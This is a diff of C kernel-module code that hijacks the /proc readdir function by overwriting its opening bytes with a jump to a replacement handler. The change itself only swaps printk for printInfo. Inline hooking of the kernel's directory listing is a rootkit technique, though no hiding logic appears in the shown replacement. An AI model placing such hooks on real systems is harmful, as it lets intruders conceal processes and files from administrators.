@@ -28,27 +28,27 @@ void *get_vfs_readdir ( const char *path )
 
 int replacement_readdir(struct file *file, void *dirent, filldir_t filldir) {
    int returnValue;
-   printk("Writing original bytes\n");
+   printInfo("Writing original bytes\n");
    writeHijackBytes(readdir_ptr, readdirOriginalBytes, NULL);
-   printk("Calling original function\n");
+   printInfo("Calling original function\n");
    returnValue = readdir_ptr(file, dirent, filldir);
-   printk("Writing back hijack function\n");
+   printInfo("Writing back hijack function\n");
    writeHijackBytes(readdir_ptr, readdirHijackBytes, NULL);
-   printk("Replacement completed successfully\n");
+   printInfo("Replacement completed successfully\n");
    return returnValue;
 }
 
 void hijack_readdir() {
-   printk("Finding proc readdir\n");
+   printInfo("Finding proc readdir\n");
    readdir_ptr = get_vfs_readdir("/proc");
-   printk("Getting hijack bytes\n");
+   printInfo("Getting hijack bytes\n");
    getHijackBytes(replacement_readdir, readdirHijackBytes);
-   printk("Hijacking function\n");
+   printInfo("Hijacking function\n");
    writeHijackBytes(readdir_ptr, readdirHijackBytes, readdirOriginalBytes);
-   printk("Hijack successful\n");
+   printInfo("Hijack successful\n");
 }
 
 void unhijack_readdir() {
    writeHijackBytes(readdir_ptr, readdirOriginalBytes, NULL);
-   printk("Unhijacked\n");
+   printInfo("Unhijacked\n");
 }
